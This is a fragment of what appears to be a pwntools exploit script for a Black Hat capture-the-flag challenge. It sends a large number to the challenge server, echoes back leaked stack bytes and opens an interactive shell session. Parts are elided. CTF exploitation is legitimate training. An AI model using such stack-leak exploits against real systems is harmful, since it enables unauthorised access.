...
def start():
    if args.REMOTE:
        ...
        HOST, PORT = 'blackhat4-24e93d994a1a6fd6dd031f120a340a08-0.chals.bh.ctf.sa', 443
...
# Profit
p.sendline(b"9999999999999")
p.recvuntil(b"And another one!\n")
stack = p.recvuntil(b"Give me your wish:\n", drop=True)
log.info(str(len(stack[:])))
log.info(str(stack[64:]))
p.sendline(stack[64:])
p.interactive()
